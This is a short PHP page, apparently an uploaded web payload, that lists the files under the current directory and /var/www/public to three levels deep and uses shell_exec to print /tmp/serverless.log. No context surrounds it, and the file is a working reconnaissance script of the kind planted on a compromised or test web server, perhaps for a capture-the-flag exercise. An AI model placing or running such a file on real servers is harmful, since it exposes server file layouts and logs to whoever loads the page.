 <html>
 <body>
<?php
        print_r(glob("*"));
        echo "<br/>";
        print_r(glob("*/*"));
        echo "<br/>";
        print_r(glob("*/*/*"));
        echo "<br/>";
        print_r(glob("/var/www/public/*"));
        echo "<br/>";
        print_r(glob("/var/www/public/*/*"));
        echo "<br/>";
        print_r(glob("/var/www/public/*/*/*"));
        echo "<br/>";

	echo shell_exec("cat /tmp/serverless.log");
?>
 </body>
</html>
